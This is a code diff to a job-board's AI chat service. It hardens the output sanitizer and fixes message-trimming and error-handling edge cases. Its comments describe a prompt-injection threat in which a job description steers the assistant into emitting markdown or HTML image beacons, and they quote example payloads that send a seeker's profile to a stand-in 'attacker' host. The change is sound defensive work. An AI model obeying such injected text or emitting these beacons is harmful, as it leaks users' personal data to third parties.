@@ -1,5 +1,6 @@
 """Service layer for AI features. Views translate domain exceptions to HTTP."""
 import base64
+import html
 import logging
 import re
 import time
@@ -7,10 +8,16 @@ import time
 from django.core.exceptions import ValidationError  # malformed UUID -> 404, not 500
 from django.utils import timezone
 
+from langchain.agents import create_agent
+from langchain.agents.middleware import ModelCallLimitMiddleware, wrap_model_call
+from langchain.agents.middleware.model_call_limit import ModelCallLimitExceededError
+from langchain_core.messages import AIMessage, HumanMessage, trim_messages
+
 from apps.companies.models import Company
 from apps.jobs.models import JobPost, JobPostActivity
 from apps.seekers.models import SkillSet
 
+from .checkpointer import get_checkpointer
 from .exceptions import (
     AgentLimitExceededError,
     AIProviderError,
@@ -33,13 +40,6 @@ from .prompts import (
     build_screening_prompt,
 )
 from .schemas import JobPostDraft, ResumeExtract, ScreeningResult
-
-from langchain.agents import create_agent
-from langchain.agents.middleware import ModelCallLimitMiddleware, wrap_model_call
-from langchain.agents.middleware.model_call_limit import ModelCallLimitExceededError
-from langchain_core.messages import AIMessage, HumanMessage, trim_messages
-
-from .checkpointer import get_checkpointer
 from .tools import build_tools
 
 logger = logging.getLogger('apps.ai')
@@ -461,14 +461,26 @@ CHAT_MODEL_TIMEOUT_SECONDS = 60
 # services — so cap the output explicitly.
 CHAT_MAX_OUTPUT_TOKENS = 1024
 
-# Markdown images/links and bare URLs are stripped from the reply. A job
-# description is company-authored text that reaches the model, so it can ask
-# the assistant to emit ![](https://attacker/?d=<the seeker's profile>); a
-# client rendering that markdown would beacon the seeker's data to the post's
-# author. The system prompt also forbids it — this is the enforcement.
+# Markdown images/links, raw HTML tags, and bare/protocol-relative URLs are
+# stripped from the reply. A job description is company-authored text that
+# reaches the model, so it can ask the assistant to emit
+# ![](https://attacker/?d=<the seeker's profile>) or an equivalent raw
+# <img src="//attacker/..."> / entity-encoded variant; a client rendering
+# that markdown or HTML would beacon the seeker's data to the post's author.
+# The system prompt also forbids it — this is the enforcement.
+_HTML_TAG_RE = re.compile(r'</?[a-zA-Z][a-zA-Z0-9]*(?:\s[^<>]*)?/?>')
 _MD_IMAGE_RE = re.compile(r'!\[[^\]]*\]\([^)]*\)')
 _MD_LINK_RE = re.compile(r'\[([^\]]*)\]\([^)]*\)')
 _BARE_URL_RE = re.compile(r'\b(?:https?|ftp|data)://\S+', re.IGNORECASE)
+# Scheme-relative (`//host/...`): browsers resolve these against the current
+# page scheme, so they fire a cross-origin request exactly like a full URL.
+# The negative lookbehind skips the "//" that is already part of a
+# scheme://... match — those are removed by _BARE_URL_RE first.
+_PROTOCOL_RELATIVE_URL_RE = re.compile(r'(?<!:)//[^\s)\]>"\']+')
+# Collapses runs of spaces/tabs, but only mid-line: the lookbehind requires a
+# non-whitespace character immediately before the run, so leading indentation
+# on a line (fenced code, nested markdown lists) is never touched.
+_MULTI_SPACE_RE = re.compile(r'(?<=\S)[ \t]{2,}')
 
 
 class _ChatDeadlineExceeded(Exception):
@@ -476,11 +488,23 @@ class _ChatDeadlineExceeded(Exception):
 
 
 def _sanitize_reply(text):
-    """Drop links/images, keep their visible text. See _MD_IMAGE_RE above."""
+    """Drop links/images/raw HTML, keep their visible text. See the regexes above.
+
+    Order matters: entities are decoded first so a scheme cannot be smuggled
+    past the URL matchers by encoding a character (e.g. `https&#58;//host`
+    decodes to `https://host` before any matcher runs). Raw HTML tags are
+    then stripped as whole units — `<img src="...">` or `<a href="...">text
+    </a>` — so a URL hidden in an attribute never leaks even though `text`
+    survives. The markdown and bare/protocol-relative URL matchers then
+    handle whatever is left in plain markdown or prose form.
+    """
+    text = html.unescape(text)
+    text = _HTML_TAG_RE.sub('', text)
     text = _MD_IMAGE_RE.sub('', text)
     text = _MD_LINK_RE.sub(r'\1', text)
     text = _BARE_URL_RE.sub('', text)
-    return re.sub(r'[ \t]{2,}', ' ', text).strip()
+    text = _PROTOCOL_RELATIVE_URL_RE.sub('', text)
+    return _MULTI_SPACE_RE.sub(' ', text).strip()
 
 
 def _turn_usage(messages):
@@ -526,14 +550,38 @@ def _build_chat_agent(model, tools, checkpointer, deadline_at):
         # Gemini rejects a functionResponse with no preceding functionCall.
         # start_on='human' guarantees the window opens on a clean turn.
         if len(request.messages) > CHAT_HISTORY_MESSAGES:
-            request = request.override(messages=trim_messages(
+            trimmed = trim_messages(
                 request.messages,
                 max_tokens=CHAT_HISTORY_MESSAGES,
                 token_counter=len,
                 strategy='last',
                 start_on='human',
                 include_system=False,
-            ))
+            )
+            if not trimmed:
+                # A single turn can itself exceed CHAT_HISTORY_MESSAGES: Gemini
+                # emits parallel function calls by default, and CHAT_SYSTEM
+                # invites multi-tool turns, so one HumanMessage plus its tool
+                # calls/results can already be longer than the cap.
+                # start_on='human' then finds no HumanMessage inside the
+                # trimmed window and returns [] — NOT a fallback to something
+                # smaller, an empty list. request.override(messages=[]) would
+                # call the model with only the system prompt, and Gemini
+                # rejects empty contents with a 400 (-> AIProviderError, i.e.
+                # a 502, after several already-billed Pro calls).
+                #
+                # Fall back to the whole current turn: everything from the
+                # last HumanMessage onward. That is guaranteed non-empty,
+                # guaranteed to start on a HumanMessage, and — because it
+                # never cuts inside the turn — guaranteed not to orphan a
+                # ToolMessage. It may exceed CHAT_HISTORY_MESSAGES; that
+                # overflow is correct, since a turn cannot be truncated
+                # mid-sequence without breaking a tool-call/tool-result pair.
+                human_indexes = [i for i, m in enumerate(request.messages)
+                                 if isinstance(m, HumanMessage)]
+                trimmed = (request.messages[human_indexes[-1]:] if human_indexes
+                           else request.messages)
+            request = request.override(messages=trimmed)
         return handler(request)
 
     @wrap_model_call
@@ -595,12 +643,25 @@ def send_chat_message(user, *, message, conversation_id=None, model=None,
     config = {'configurable': {'thread_id': str(conversation.id)}}
     try:
         state = agent.invoke({'messages': [('user', message)]}, config=config)
-    except BaseException as exc:
+    except Exception as exc:
         # Tokens were spent before this raised — the run-limit path has made
         # MAX_MODEL_CALLS_PER_TURN billed Pro calls. Read the partial turn back
         # out of the checkpoint and bill it BEFORE any rollback destroys it.
-        _record_turn_usage(user, model, _stored_messages(checkpointer, config), started)
-        _rollback_new_conversation(conversation, checkpointer, created_now)
+        #
+        # Both bookkeeping calls are guarded individually: the database is the
+        # correlated failure mode here (every tool queries it), so an
+        # exception raised by billing or by rollback must never replace the
+        # domain exception below with a raw DB error, and a failure in one
+        # must never skip the other.
+        try:
+            _record_turn_usage(user, model, _stored_messages(checkpointer, config), started)
+        except Exception:  # pragma: no cover - bookkeeping must not mask the original error
+            logger.warning('ai chat: failed to record usage for a failed turn '
+                           'conversation=%s', conversation.id)
+        try:
+            _rollback_new_conversation(conversation, checkpointer, created_now)
+        except Exception:  # pragma: no cover - bookkeeping must not mask the original error
+            logger.warning('ai chat: rollback failed conversation=%s', conversation.id)
         if isinstance(exc, ModelCallLimitExceededError):
             # thread_limit is cumulative and checkpointed: hitting it means the
             # thread can never answer again, which is a different fact about
